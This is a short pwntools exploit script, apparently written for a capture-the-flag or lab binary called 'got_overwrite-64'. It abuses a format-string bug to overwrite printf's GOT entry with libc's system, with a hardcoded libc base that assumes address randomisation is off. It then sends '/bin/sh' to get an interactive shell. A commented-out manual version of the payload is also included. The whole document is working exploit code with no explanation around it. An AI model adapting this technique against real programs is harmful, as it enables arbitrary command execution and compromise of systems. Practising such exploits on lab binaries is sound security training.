from pwn import *

elf = context.binary = ELF('./got_overwrite-64')
p = process()
libc = elf.libc
libc.address = 0x00007ffff7c00000

# p.sendline(flat(
#     elf.got['printf'],
#     b'x' * (libc.sym['system'] - 8),
#     b'%6$n'
# ))
p.sendline(fmtstr_payload(6, {elf.got['printf']: libc.sym['system']}))
p.sendline(b'/bin/sh')
p.interactive()
